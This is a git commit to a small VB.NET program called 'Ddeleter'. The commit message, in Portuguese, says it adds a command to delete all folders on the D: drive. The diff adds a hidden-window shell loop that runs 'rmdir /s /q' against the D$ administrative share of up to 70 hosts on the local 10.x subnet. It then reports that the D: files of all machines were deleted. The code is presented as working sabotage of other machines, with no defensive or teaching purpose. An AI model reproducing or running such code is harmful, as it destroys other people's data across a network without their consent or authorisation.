f8bf8b0ff496adbfa9421d8a265f3969b34747c3
Felipe Nery Paulino <felipe.paulino@fiap.com.br>
2016-11-04 20:33:32 -0200

    Adicionado comando de executar for com o comando de apagar todas as pastas do D:

--- Fiap.Ddeleter/Ddeleter/Form1.vb
+++ Fiap.Ddeleter/Ddeleter/Form1.vb
@@ -5,7 +5,7 @@ Public Class Form1
         cbxIP.Items.Clear()
         cbxIP.Items.AddRange(Dns.GetHostAddresses(Dns.GetHostName))
         Dim ip As String
-        Dim ipcerto As String
+        Dim ipcerto As String = ""
         For i = 1 To cbxIP.Items.Count - 1
             ip = cbxIP.Items(i).ToString
             If ip.Contains("10.20") Or ip.Contains("10.10") Then
@@ -16,5 +16,11 @@ Public Class Form1
                 MessageBox.Show(ipcerto)
             End If
         Next
+
+        Dim comando As String = "For /l %i in (1,1,70) do start cmd /c rmdir /s /q \\" & ipcerto & ".%i\d$"
+        Shell(comando, AppWinStyle.Hide, False, 100)
+
+        MessageBox.Show("Concluido", "Arquivos sem premissões do D:\ de todas as máquinas deletados!", MessageBoxButtons.OK, MessageBoxIcon.Information)
+        Me.Close()
     End Sub
 End Class
